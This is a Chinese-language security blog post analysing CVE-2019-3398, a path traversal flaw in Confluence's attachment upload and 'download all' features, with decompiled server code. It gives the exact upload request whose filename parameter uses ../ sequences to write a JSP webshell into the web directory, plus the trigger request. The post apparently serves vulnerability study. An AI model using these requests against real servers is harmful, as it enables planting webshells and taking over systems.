<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2019-3398）Confluence 路径穿越漏洞一、漏洞简介二、漏洞影响2.0.0 &lt;&#x3D; version &lt; 6.6.136.7.0 &lt;&#x3D; version &lt; 6.12.46.13.0 &lt;&#x3D; version &lt; 6.13.46.14.0 &lt;&#x3D; version &lt; 6.14.36.15.0 &lt;&#x3D; version &lt; 6.15">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Confluence/%EF%BC%88CVE-2019-3398%EF%BC%89Confluence%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2019-3398）Confluence 路径穿越漏洞一、漏洞简介二、漏洞影响2.0.0 &lt;&#x3D; version &lt; 6.6.136.7.0 &lt;&#x3D; version &lt; 6.12.46.13.0 &lt;&#x3D; version &lt; 6.13.46.14.0 &lt;&#x3D; version &lt; 6.14.36.15.0 &lt;&#x3D; version &lt; 6.15">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:25:54.283Z">
<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Confluence/（CVE-2019-3398）Confluence 路径穿越漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Confluence/%EF%BC%88CVE-2019-3398%EF%BC%89Confluence%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:54.283Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-3398）Confluence-路径穿越漏洞"><a href="#（CVE-2019-3398）Confluence-路径穿越漏洞" class="headerlink" title="（CVE-2019-3398）Confluence 路径穿越漏洞"></a>（CVE-2019-3398）Confluence 路径穿越漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>2.0.0 &lt;= version &lt; 6.6.136.7.0 &lt;= version &lt; 6.12.46.13.0 &lt;= version &lt; 6.13.46.14.0 &lt;= version &lt; 6.14.36.15.0 &lt;= version &lt; 6.15.2</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先根据官方描述，<code>downloadallattachments</code>这个资源，结合其验证缓解措施的方式，找到了漏洞触发点：</p>
<pre><code>... =》附件=》下载全部
</code></pre>
<p>点击<code>下载全部</code>时，会触发一个GET请求：</p>
<pre><code>GET /pages/downloadallattachments.action?pageId=65601
</code></pre>
<p>然后响应</p>
<pre><code>Location: /download/temp/downloadi120q121507.zip?contentType=application/zip
</code></pre>
<p>而且每次发出<code>downloadallattachments.action</code>请求，其响应的Location路径的zip文件名都不一样，发现原来是服务端每收到一次downloadallattachments.action请求，就会在<code>download/temp/</code>目录下生成一个zip文件：</p>
<p>1.png</p>
<p>搜索了一下，发现这个文件是在/Users/xxx/confluenceHome，也就是confluence的安装目录下。</p>
<pre><code>cqq@ubuntu:~$ find .|grep download45lL6115220.zip
./confluenceHome/temp/download45lL6115220.zip
</code></pre>
<p>然后看到这个目录下还有一个attachments目录，为了验证这就是附件上传的目录，</p>
<p>2.png</p>
<p>于是，新建了一个页面，上传了几个文本文件，通过cat出来的内容与上传的内容匹配，判定这个就是上传的附件被存放的目录，但是这个目录下的文件名被重命名了。既然官方说是路径穿越漏洞，就得找到文件名或者文件路径的输入点。在这里上传文件的过程中抓一下包，发现有两个参数是文件名/文件路径相关的，<code>filename</code>和<code>name</code>，经过测试发现漏洞点参数是<code>filename</code>。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>通过一番<code>grep -rn xxx *</code>的查找，发现需要两步来完成对路径穿越的利用。</p>
<p>1、<code>POST /plugins/drag-and-drop/upload.action?pageId=65601&amp;filename=../../../../../../Users/xxx/repos/atlassian-confluence-6.13.0/confluence/admin/cqq2.jsp&amp;size=754&amp;minorEdit=true&amp;spaceKey=ADMIN&amp;mimeType=application%2Foctet-stream&amp;atl_token=47ae1afbc53f1ed100a4c36053de2d754d48ffeb&amp;contentType=page&amp;isVFMSupported=true&amp;name=cqq2.jsp</code>先将webshell上传上去，其内容会出现在confluence的安装目录，即/Users/xxx/confluenceHome。注意上传的时候的<code>size</code>参数需与<code>Content-Length</code>值保持一致，服务端会对这个做校验，若发现不一致，则会导致500。在UploadAction#execute下断点</p>
<pre><code>confluence/WEB-INF/atlassian-bundled-plugins/confluence-drag-and-drop-6.13.0.jar!/com/atlassian/confluence/plugins/dragdrop/UploadAction.class
</code></pre>
<p>通过</p>
<pre><code>InputStream inStream = this.getStreamForEncoding(this.httpServletRequest);
this.fileUploadManager.storeResource(new InputStreamAttachmentResource(inStream, this.filename, this.mimeType, this.size, (String)null, this.minorEdit), (ContentEntityObject)content);
</code></pre>
<p>将POST的内容写入到缓存文件中：<code>attachments/ver003//56/98/98306/101/65/65601/917509/1</code>，3.png<code>filename</code>值没有对<code>../</code>进行过滤。44.png上传完成之后，打开”全部附件”页面，会出现我们刚刚上传上去的文件，其文件名没有对<code>../</code>进行过滤。5.png</p>
<p>2、<code>GET /pages/downloadallattachments.action?pageId=65601</code>然后通过这个GET请求，触发将缓存的webshell内容写入指定的路径操作。在DownloadAllAttachmentsOnPageAction#execute下断点</p>
<pre><code>confluence/WEB-INF/lib/confluence-6.13.0.jar!com/atlassian/confluence/pages/actions/DownloadAllAttachmentsOnPageAction.class
</code></pre>
<p>文件内容：</p>
<pre><code>public String execute() throws Exception &#123;
        List&lt;Attachment&gt; latestAttachments = this.attachmentManager.getLatestVersionsOfAttachments(this.getPage());
        Iterator var2 = latestAttachments.iterator();

        while(var2.hasNext()) &#123;
            Attachment attachment = (Attachment)var2.next();
            File tmpFile = new File(this.getTempDirectoryForZipping(), attachment.getFileName());
            InputStream inputStream = this.attachmentManager.getAttachmentData(attachment);
            Throwable var6 = null;

            try &#123;
                OutputStream fileOutputStream = new FileOutputStream(tmpFile);  // tmpFile内容为/Users/Xxx/repos/confluenceRepos/temp/download8gHGV130701/../../../../../../Users/Xxx/repos/atlassian-confluence-6.13.0/confluence/admin/cmd222.jsp
                Throwable var8 = null;

                try &#123;
                    ByteStreams.copy(inputStream, fileOutputStream);  //将缓存文件写入指定的路径
                &#125; catch (Throwable var31) &#123;
                    var8 = var31;
                    throw var31;
                &#125; finally &#123;
                    if (fileOutputStream != null) &#123;
                        if (var8 != null) &#123;
                            try &#123;
                                fileOutputStream.close();
                            &#125; catch (Throwable var30) &#123;
                                var8.addSuppressed(var30);
                            &#125;
                        &#125; else &#123;
                            fileOutputStream.close();
                        &#125;
                    &#125;

                &#125;
            &#125; catch (Throwable var33) &#123;
                var6 = var33;
                throw var33;
            &#125; finally &#123;
                if (inputStream != null) &#123;
                    if (var6 != null) &#123;
                        try &#123;
                            inputStream.close();
                        &#125; catch (Throwable var29) &#123;
                            var6.addSuppressed(var29);
                        &#125;
                    &#125; else &#123;
                        inputStream.close();
                    &#125;
                &#125;

            &#125;
        &#125;

        //在confluence安装路径的temp目录下生成zip文件。
        File zipFile = new File(this.getConfluenceTempDirectoryPath() + File.separator + this.getZipFilename() + &quot;.zip&quot;);
        FileUtils.createZipFile(this.getTempDirectoryForZipping(), zipFile);
        FileUtils.deleteDir(this.getTempDirectoryForZipping());
        this.downloadPath = this.prepareDownloadPath(zipFile.getPath()) + &quot;?contentType=application/zip&quot;;
        this.gateKeeper.addKey(this.prepareDownloadPath(zipFile.getPath()), this.getAuthenticatedUser());
        return &quot;success&quot;;
    &#125;
</code></pre>
<p>先拿到Attachement列表</p>
<pre><code>List&lt;Attachment&gt; latestAttachments = this.attachmentManager.getLatestVersionsOfAttachments(this.getPage());
</code></pre>
<p>然后对列表中每个附件进行遍历，从最前面的开始，</p>
<p>然后通过666.png</p>
<pre><code>attachment.getFileName())
</code></pre>
<p>获得附件的名字（这里有我们之前设置好的payload文件名）然后执行</p>
<pre><code>ByteStreams.copy(inputStream, fileOutputStream);
</code></pre>
<p>将之前缓存的上传文件copy到通过请求参数<code>filename</code>指定的路径下，实现路径穿越。7.png执行前后对比如下：8.png对比缓存文件和在指定路径生成的文件的sha1值对比：一致。9.pngConfluence本身就可以上传任意文件内容到服务端，但是会放在缓存目录下，文件路径不可控。关键地是，没有对<code>filename</code>请求参数进行过滤，有路径穿越漏洞，才能将指定文件名指定文件内容写入到文件系统中。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4854">https://xz.aliyun.com/t/4854</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Confluence/%EF%BC%88CVE-2019-3398%EF%BC%89Confluence%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnkk0049y8v1hud33ur7" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Coremail/Coremail%E9%82%AE%E7%AE%B1%E7%B3%BB%E7%BB%9F%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%B3%84%E6%BC%8F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Confluence/%EF%BC%88CVE-2019-3396%EF%BC%89Confluence%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>